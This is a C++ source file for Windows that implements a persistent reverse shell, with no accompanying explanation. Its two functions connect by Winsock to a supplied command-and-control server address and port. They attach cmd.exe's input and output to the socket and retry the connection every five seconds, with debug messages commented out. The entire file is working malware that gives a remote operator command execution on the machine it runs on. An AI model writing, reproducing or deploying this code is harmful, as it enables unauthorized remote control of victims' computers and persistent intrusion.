#include "ReverseShell.h"
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <cstring>
#include <cstdlib>

#pragma comment(lib, "Ws2_32.lib")

#define DEFAULT_BUFLEN 1024

void RunShell(const char* C2Server, int C2Port) {
    while (true) {
        Sleep(5000);  // Wait for 5 seconds before reconnecting

        SOCKET mySocket;
        sockaddr_in addr;
        WSADATA version;

        // Initialize Winsock
        if (WSAStartup(MAKEWORD(2, 2), &version) != 0) {
            continue;
        }

        // Create a socket
        mySocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
        if (mySocket == INVALID_SOCKET) {
            WSACleanup();
            continue;
        }

        // Configure the server address
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr(C2Server);
        addr.sin_port = htons(C2Port);

        // Attempt to connect to the C2 server
        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
            closesocket(mySocket);
            WSACleanup();
            continue;
        }

        // Receive data from the C2 server
        char RecvData[DEFAULT_BUFLEN] = {0};
        int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
        if (RecvCode <= 0) {
            closesocket(mySocket);
            WSACleanup();
            continue;
        }

        // Spawn the reverse shell
        wchar_t Process[] = L"cmd.exe";
        STARTUPINFOW sinfo;
        PROCESS_INFORMATION pinfo;

        memset(&sinfo, 0, sizeof(sinfo));
        sinfo.cb = sizeof(sinfo);
        sinfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)mySocket;

        if (!CreateProcessW(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo)) {
            closesocket(mySocket);
            WSACleanup();
            continue;
        }

        // Wait for the process to complete
        WaitForSingleObject(pinfo.hProcess, INFINITE);
        CloseHandle(pinfo.hProcess);
        CloseHandle(pinfo.hThread);

        // Check for exit command
        memset(RecvData, 0, sizeof(RecvData));
        RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
        if (RecvCode <= 0 || strcmp(RecvData, "exit\n") == 0) {
            closesocket(mySocket);
            WSACleanup();
            break;
        }
    }
}

// Function to attempt reconnection to the listener
void ReconnectToListener(const char* C2Server, int C2Port) {
    while (true) {
        Sleep(5000);  // Wait for 5 seconds before reconnecting

        SOCKET mySocket;
        sockaddr_in addr;
        WSADATA version;

        // Initialize Winsock
        if (WSAStartup(MAKEWORD(2, 2), &version) != 0) {
            // std::cerr << "[ERROR] WSAStartup failed. Retrying..." << std::endl;
            continue;
        }

        // Create a socket
        mySocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
        if (mySocket == INVALID_SOCKET) {
            // std::cerr << "[ERROR] Failed to create socket. Retrying..." << std::endl;
            WSACleanup();
            continue;
        }

        // Configure the server address
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr(C2Server);
        addr.sin_port = htons(C2Port);

        // Attempt to connect to the listener
        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
            // std::cerr << "[ERROR] Connection failed. Retrying..." << std::endl;
            closesocket(mySocket);
            WSACleanup();
            continue;
        }

        // std::cout << "[INFO] Connected to C2 server." << std::endl;

        // Spawn the reverse shell
        wchar_t Process[] = L"cmd.exe";
        STARTUPINFOW sinfo;
        PROCESS_INFORMATION pinfo;

        memset(&sinfo, 0, sizeof(sinfo));
        sinfo.cb = sizeof(sinfo);
        sinfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)mySocket;

        if (!CreateProcessW(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo)) {
            // std::cerr << "[ERROR] Failed to create process. Retrying..." << std::endl;
            closesocket(mySocket);
            WSACleanup();
            continue;
        }

        // Wait for the process to complete
        WaitForSingleObject(pinfo.hProcess, INFINITE);
        CloseHandle(pinfo.hProcess);
        CloseHandle(pinfo.hThread);

        // std::cerr << "[INFO] Connection lost. Attempting to reconnect..." << std::endl;

        // Clean up before the next attempt
        closesocket(mySocket);
        WSACleanup();
    }
}